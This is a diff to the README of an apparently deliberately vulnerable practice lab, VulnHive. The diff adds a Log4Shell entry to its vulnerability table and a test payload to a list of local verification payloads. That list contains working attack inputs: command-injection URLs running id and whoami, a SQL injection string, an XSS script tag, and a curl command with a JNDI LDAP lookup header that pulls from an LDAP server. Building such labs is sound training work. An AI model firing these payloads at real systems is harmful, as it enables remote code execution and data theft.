@@ -40,6 +40,7 @@ The nodes within VulnHive map directly to critical vulnerabilities identified in
 | **Auth Failure** | Pre-Auth RCE | Fuel CMS 1.4.1 (Searchsploit 47138)| A07:2021-Identification and Authentication Failures |
 | **Insecure Design**| IDOR / Broken Access | Bus Pass Management 1.0 (Searchsploit 50263)| A04:2021-Insecure Design |
 | **Security Misconfig**| Default Credentials | CMSimple 5.15 (Searchsploit 39271) | A05:2021-Security Misconfiguration |
+| **Outdated Component**| Log4Shell (RCE) | Log4j 2.14.1 (CVE-2021-44228) | A06:2021-Vulnerable and Outdated Components |
 
 ## Installation & Usage
 
@@ -71,6 +72,7 @@ To verify your environment is working, you can try the following payloads agains
 *   **RCE (Atom CMS):** `http://127.0.0.1:54322/index.php?cmd=id`
 *   **SQLi (Cuppa CMS):** `http://127.0.0.1:54323/index.php?id=1'%20OR%201=1`
 *   **Crypto (CuteNews):** `http://127.0.0.1:54330/data/users.db.php`
+*   **Log4j (Outdated):** `curl http://127.0.0.1:54331 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}'`
 *   **XSS (WonderCMS):** `http://127.0.0.1:54324/?xss=<script>alert('VulnHive')</script>`
 *   **PHP Backdoor:** `http://127.0.0.1:54325/?cmd=whoami`
 
